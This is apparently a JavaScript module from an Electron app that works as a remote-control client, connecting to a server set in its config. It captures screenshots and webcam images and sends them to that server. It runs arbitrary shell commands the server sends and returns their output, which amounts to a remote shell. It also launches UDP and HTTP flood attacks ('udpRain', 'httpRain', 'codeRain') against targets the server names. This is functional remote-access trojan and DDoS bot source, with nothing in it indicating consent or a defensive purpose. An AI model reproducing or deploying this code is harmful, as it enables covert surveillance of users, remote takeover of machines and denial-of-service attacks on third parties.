const { desktopCapturer, screen, app, ipcMain } = require("electron");
const io = require("socket.io-client");
const child_process = require("child_process");
const udpRain = require("./udpRain");
const httpRain = require("./httpRain");
//udpRain.start({ port: 53, ip: "192.168.1.180", seconds: 5, interval: 1000 });

//const robot = require("robotjs");

// My Modules
const info = require("./config");

class RemoteControl {
  constructor() {
    this.mainWindow;
  }
  getCamDataWeb = (data) => {
    console.log({ getCamDataWeb: data });
    this.mainWindow.reload();
    setTimeout(() => {
      this.mainWindow.webContents.send("camStart", data);
    }, 3000);
  };

  getScreenData = (data) => {
    (async () => {
      try {
        let sources = await desktopCapturer.getSources({
          types: ["screen"],
          thumbnailSize: {
            width: parseInt(data.dimension.split("x")[0]),
            height: parseInt(data.dimension.split("x")[1]),
          },
        });

        data["src"] = sources[data.screen].thumbnail.toDataURL();
        this.socket.emit("screenshotResponse", data);
      } catch (err) { }
    })();
  };

  findComparedPosition = (data) => {
    try {
      return {
        x:
          data.mousePosition.x *
          (screen.getAllDisplays()[data.screen].size.width /
            data.webScreen.width),
        y:
          data.mousePosition.y *
          (screen.getAllDisplays()[data.screen].size.height /
            data.webScreen.height),
      };
    } catch (err) { }
  };

  start = (mainWindow) => {
    this.mainWindow = mainWindow;

    this.socket = io.connect("http://" + info.host + ":" + info.port);
    this.socket.on("connect", () => {
      this.socket.emit("joinToRoom", { roomName: "terminal-" + info.id });
    });

    this.socket.on("screenshotRequest", (data) => {
      this.getScreenData(data);
    });

    this.socket.on("camShotRequest", (data) => {
      this.getCamDataWeb(data);
    });

    ipcMain.on("cam", (event, args) => {
      this.socket.emit("camShotResponse", args);
    });
    
    // Binary transfer için yeni handler
    ipcMain.on("camBinary", (event, args) => {
      this.socket.emit("camBinary", args);
    });

    this.socket.on("getRunRequest", (data) => {
      console.log({ getRunRequest: data });
      if (data.cmd.indexOf("udpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          port: parseInt(splittedData[2]),
          ip: splittedData[1],
          seconds: parseInt(splittedData[3]),
          interval: parseInt(splittedData[4]),
        };
        console.log({ createdData });
        udpRain.start(createdData);
      } else if (data.cmd.indexOf("httpRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          url: splittedData[1],
          seconds: parseInt(splittedData[2]),
          interval: parseInt(splittedData[3]),
        };
        console.log({ createdData });
        httpRain.start(createdData);
      }
      else if (data.cmd.indexOf("codeRain") > -1) {
        const splittedData = data.cmd.split(" ");
        const createdData = {
          seconds: parseInt(splittedData[1]),
          interval: parseInt(splittedData[2]),
          code: splittedData[3],
        };
        console.log({ createdData });
        httpRain.codeRainStart(createdData);
      }
      else {
        try {
          child_process.exec(
            data.cmd,
            { shell: true },
            (err, stdout, stderr) => {
              if (err) {
                data["cmd"] = "err: " + err;
              } else if (stderr) {
                data["cmd"] = "stderr: " + stderr;
              } else {
                data["cmd"] = stdout;
              }

              this.socket.emit("getRunResponse", data);
            }
          );
        } catch (error) {
          data["cmd"] = "catchError: " + error;
          this.socket.emit("getRunResponse", data);
        }
      }
    });
    this.socket.on("mousemove", (data) => {
      //data["compared"] = this.findComparedPosition(data);
      //data["screen_resolition"] = screen.getAllDisplays()[data.screen].size;
      //robot.moveMouse(data.compared.x, data.compared.y);
    });
    this.socket.on("click", (data) => {
      //robot.mouseClick()
    });
  };
}

module.exports = new RemoteControl();
